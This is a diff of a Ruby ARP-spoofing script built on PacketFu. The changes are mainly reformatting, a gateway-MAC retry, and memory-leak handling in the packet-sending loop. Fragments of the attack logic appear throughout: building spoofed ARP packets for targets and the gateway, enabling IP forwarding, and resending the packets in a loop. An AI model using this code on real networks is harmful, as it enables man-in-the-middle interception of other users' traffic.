@@ -72,7 +72,7 @@ def target_parse(target)
     to 		= range[/\A(\w*.){3}/] + range.split("-")[1]	
     ip_from 	= IPAddr.new(from)
     ip_to 		= IPAddr.new(to)
-    (ip_from..ip_to).each { |ip| @target << ip.to_s }   # Enter each value of range into @target 
+    (ip_from..ip_to).each { |ip| @target << ip.to_s }   # Enter each value of range into @target
   end
 end
 
@@ -96,16 +96,16 @@ if interactive
     @gateway = ((net[0]).split)[1] 
     if ip_check(@gateway)
     print "Gateway appears to be #{@gateway}.\nEnter to accept, or type an alternative IP: "
-  else
-    print "Unable to determine gateway. Please enter IP: "
+    else
+      print "Unable to determine gateway. Please enter IP: "
+    end
+    temp = gets.chomp
+    @gateway = temp unless temp.empty?
+    if !ip_check(@gateway)
+      puts "Invalid IP address. Try again..."
+      sleep 1
+    end 
   end
-  temp = gets.chomp
-  @gateway = temp unless temp.empty?
-  if !ip_check(@gateway)
-    puts "Invalid IP address. Try again..."
-    sleep 1
-  end 
-end
 
   var = false
   until var 
@@ -140,7 +140,7 @@ end
 =end
 
   print "Enter target IP: "
-  target 		= gets.chomp
+  target = gets.chomp
 
 # CL mode	
 else 	
@@ -159,7 +159,7 @@ else
 var1 = "S"
 end
 =end	
-  var1 = "S"
+var1 = "S"
     if @gateway
       var2 = "two-way with gateway #{@gateway}."
     else
@@ -185,7 +185,13 @@ target_parse(target)
 puts_verbose("\nObtaining mac addresses...")
 @targets_hash = {}
 gateway_mac = PacketFu::Utils::arp(@gateway, :iface => @iface)
-puts_verbose "Gateway (#{@gateway}): mac is #{gateway_mac}"
+unless gateway_mac 
+  (0..1).map { gateway_mac = PacketFu::Utils::arp(@gateway, :iface => @iface) } # Try twice more, then exit.
+  puts "Unable to determine gateway mac."
+  sleep 2
+  exit 0 
+end
+puts_verbose "#{@gateway}: mac is #{gateway_mac} (Gateway)"
 @target.each do |ip|
   target_mac = PacketFu::Utils::arp(ip, :iface => @iface)
   @targets_hash[ip] = target_mac     # Makes hash of target ips => target macs
@@ -194,8 +200,8 @@ puts_verbose "Gateway (#{@gateway}): mac is #{gateway_mac}"
   else
     puts_verbose "#{ip}: is down"
   end
-  @targets_hash.delete_if { |k, v| v.nil? }
 end
+@targets_hash.delete_if { |k, v| v.nil? }
 
 #------------------------------------------------------#
 # Make arrays of packets for targets and gateway
@@ -224,7 +230,7 @@ if @two_way
     @gateway_packets  << arp_pkt_gateway
   end
 end
-
+    
 `echo 1 > /proc/sys/net/ipv4/ip_forward`
 send_packets = true
 while send_packets
@@ -235,5 +241,7 @@ while send_packets
     @gateway_packets.each do |pkt|
       pkt.to_w(@iface)
     end
+    GC.start   # to deal with memory leak
+    sleep 1.5
   end
 end
